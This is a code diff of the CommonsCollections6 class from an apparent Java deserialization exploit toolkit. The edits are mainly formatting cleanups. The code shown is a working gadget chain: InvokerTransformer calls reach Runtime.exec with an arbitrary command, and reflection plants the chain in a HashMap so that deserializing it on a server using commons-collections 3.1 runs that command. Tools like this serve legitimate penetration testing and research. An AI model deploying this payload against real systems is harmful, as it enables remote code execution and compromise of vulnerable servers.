@@ -35,24 +35,24 @@ import java.util.Map;
 */
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"commons-collections:commons-collections:3.1"})
-@Authors({ Authors.MATTHIASKAISER })
+@Authors({Authors.MATTHIASKAISER})
 public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<Serializable> {
 
     public Serializable getObject(final String command) throws Exception {
 
-        final String[] execArgs = new String[] { command };
+        final String[] execArgs = new String[]{command};
 
-        final Transformer[] transformers = new Transformer[] {
-                new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod", new Class[] {
-                        String.class, Class[].class }, new Object[] {
-                        "getRuntime", new Class[0] }),
-                new InvokerTransformer("invoke", new Class[] {
-                        Object.class, Object[].class }, new Object[] {
-                        null, new Object[0] }),
-                new InvokerTransformer("exec",
-                        new Class[] { String.class }, execArgs),
-                new ConstantTransformer(1) };
+        final Transformer[] transformers = new Transformer[]{
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod", new Class[]{
+                String.class, Class[].class}, new Object[]{
+                "getRuntime", new Class[0]}),
+            new InvokerTransformer("invoke", new Class[]{
+                Object.class, Object[].class}, new Object[]{
+                null, new Object[0]}),
+            new InvokerTransformer("exec",
+                new Class[]{String.class}, execArgs),
+            new ConstantTransformer(1)};
 
         Transformer transformerChain = new ChainedTransformer(transformers);
 
@@ -74,7 +74,7 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
         Reflections.setAccessible(f);
         HashMap innimpl = (HashMap) f.get(map);
 
-        Field f2 = null;
+        Field f2;
         try {
             f2 = HashMap.class.getDeclaredField("table");
         } catch (NoSuchFieldException e) {
@@ -85,14 +85,14 @@ public class CommonsCollections6 extends PayloadRunner implements ObjectPayload<
         Object[] array = (Object[]) f2.get(innimpl);
 
         Object node = array[0];
-        if(node == null){
+        if (node == null) {
             node = array[1];
         }
 
         Field keyField = null;
-        try{
+        try {
             keyField = node.getClass().getDeclaredField("key");
-        }catch(Exception e){
+        } catch (Exception e) {
             keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
         }
 
